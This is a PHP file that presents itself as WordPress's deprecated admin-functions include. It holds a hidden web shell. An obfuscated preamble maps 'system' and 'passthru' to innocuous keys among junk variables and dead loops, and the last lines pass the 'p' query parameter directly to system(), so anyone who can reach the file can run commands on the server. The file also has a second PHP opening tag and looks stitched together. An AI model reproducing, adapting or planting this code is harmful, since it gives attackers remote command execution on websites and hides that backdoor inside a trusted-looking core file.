<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Administration Functions
 *
 * This file is deprecated, use 'wp-admin/includes/admin.php' instead.
 *
 * @deprecated 2.5.0
 * @package WordPress
 * @subpackage Administration
 */

// Don't load directly.
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

_deprecated_file( basename( __FILE__ ), '2.5.0', 'wp-admin/includes/admin.php' );

/** WordPress Administration API: Includes all Administration functions. */
require_once ABSPATH . 'wp-admin/includes/admin.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>